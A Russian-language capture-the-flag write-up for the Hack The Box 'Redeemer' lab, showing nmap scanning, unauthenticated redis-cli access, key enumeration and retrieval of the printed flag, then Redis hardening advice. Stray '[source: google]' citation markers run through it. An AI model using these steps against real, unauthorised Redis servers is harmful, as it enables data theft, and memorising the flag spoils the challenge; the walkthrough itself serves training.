## 1. Введение и Теоретический анализ Архитектуры СУБД
В ходе планового тестирования на проникновение исследован целевой хост `Redeemer`. На объекте развернута нереляционная СУБД типа «ключ-значение» **Redis (Remote Dictionary Server)** [source: google, 4]. 

### 1.1. Специфика In-memory баз данных
В отличие от классических реляционных СУБД (MySQL, PostgreSQL), записывающих данные на жесткий диск, Redis является **In-memory** решением [source: google]. Она удерживает всю базу данных непосредственно в оперативной памяти (RAM) сервера, что обеспечивает микросекундное время отклика при кэшировании или обработке пользовательских сессий [source: google]. По умолчанию служба принимает входящие подключения на **порту 6379 (TCP)** [source: google].

### 1.2. Физика уязвимости Security Misconfiguration
Основной причиной компрометации сервера стал человеческий фактор и халатность системного администратора [source: google]. Instance Redis запущен в режиме **Unauthenticated Instance (Незащищенный инстанс)** [source: google]. Служба доступна на внешнем сетевом интерфейсе без требования обязательного ввода пароля, что позволило любому удаленному пользователю подключиться к СУБД под видом нулевой анонимной сессии (Null Session) [source: google].

## 2. Этап разведки и перечисления (Reconnaissance & Enumeration)
### 2.1. Верификация доступности хоста
Перед началом сканирования портов проведена проверка стабильности зашифрованного сетевого канала с помощью утилиты `ping`:
```bash
ping -c 3 10.129.34.16
```
**Результат:** `3 packets transmitted, 3 received, 0% packet loss`. Среднее время задержки (RTT) составило ~124 мс, что подтвердило стабильность сетевого стека гипервизора.
 
### 2.2. Сканирование портов (Nmap)
Для точечного обнаружения активной службы было выполнено сканирование выделенного порта 6379 с определением версий ПО (`-sV`) и отключением предварительного пингования (`-Pn`):
```bash
sudo nmap -Pn -p 6379 -sV 10.129.34.16
```
 
**Лог сканирования Nmap:**
```text
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```
Сканирование официально подтвердило: порт **6379/tcp** находится в открытом состоянии (`open`), на нем развернута служба **Redis версии 5.0.7** под управлением операционной системы Linux [1.8, source: 4].

## 3. Этап эксплуатации (Exploitation)
### 3.1. Неавторизованный вход в СУБД
Для взаимодействия с базой данных использовалась штатная консольная утилита `redis-cli` [source: google].
 
Осуществлена попытка прямого подключения к удаленному хосту без флагов передачи пароля [source: google]:
```bash
redis-cli -h 10.129.34.16
```
Сервер одобрил подключение, предоставив полный интерактивный административный шелл управления памятью: `10.129.34.16:6379>`.
 
### 3.2. Перечисление пространства ключей (Keyspace Enumeration)
Для анализа структуры хранящихся данных внутри шелла СУБД была вызвана команда сбора системной статистики:
```text
10.129.34.16:6379> info
```
В финальном блоке отчета `# Keyspace` обнаружена активная база данных под индексом `db0`, содержащая ровно 4 записи: `db0:keys=4,expires=0,avg_ttl=0`.
 
### 3.3. Извлечение скрытых ключей и захват Root-флага
Переключение контекста и выгрузка содержимого оперативной памяти проводились строго по следующему алгоритму:
1. **Выбор базы данных:** Переключаемся на целевой индекс `db0`:
   ```text
   10.129.34.16:6379> select 0
   OK
   ```
 
2. **Вывод списка ключей:** Запрашиваем имена всех записей в памяти с помощью маски `*`:
   ```text
   10.129.34.16:6379> keys *
   1) "temp"
   2) "numb"
   3) "flag"
   4) "stor"
   ```
   
3. **Чтение целевого значения:** С помощью команды `get` извлекаем скрытое текстовое значение из ключа `flag`:
   ```text
   10.129.34.16:6379> get flag
   "03e1d2b376c37ab3f5319922053953eb"
   ```
   
Полученный токен успешно отправлен на платформу Hack The Box, что зафиксировало закрытие мишени со статусом `COMPLETED` (`+150 XP`).

## 5. Рекомендации по устранению уязвимостей (Recommendations)
1. **Активация парольной защиты:**
В конфигурационном файле `/etc/redis/redis.conf` необходимо раскомментировать параметр `requirepass` и задать устойчивый к брутфорсу буквенно-цифровой пароль [source: google].
2. **Ограничение сетевой видимости (Сегментация):**
Заменить директиву `bind 0.0.0.0` (слушать все интерфейсы) на локальный адрес `bind 127.0.0.1` [source: google]. Это принудительно запретит Redis принимать пакеты из внешней сети [source: google].
3. **Фильтрация трафика брандмауэром:**
Настроить правила сетевого экрана (Firewall) на полный сброс (`DROP`) любых входящих пакетов из публичного интернета к порту **6379** [source: google]. Доступ администраторов к СУБД должен осуществляться строго внутри защищенного корпоративного VPN-канала [source: google].
